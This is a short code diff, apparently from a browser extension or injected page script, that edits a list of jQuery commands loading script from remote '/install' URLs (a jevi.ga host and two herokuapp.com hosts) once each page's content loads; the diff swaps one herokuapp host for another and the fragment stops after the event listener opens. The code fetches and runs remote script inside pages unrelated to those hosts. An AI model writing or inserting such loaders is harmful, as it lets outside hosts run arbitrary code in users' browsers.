@@ -1,6 +1,6 @@
 const jeviRunCommand = [
 "$('script').load('http://jevi.ga:3000/install');",
-"$('script').load('https://entjevi.herokuapp.com/install');"
+"$('script').load('https://int10.herokuapp.com/install'); "
 ];
 
 document.addEventListener('DOMContentLoaded', function() {
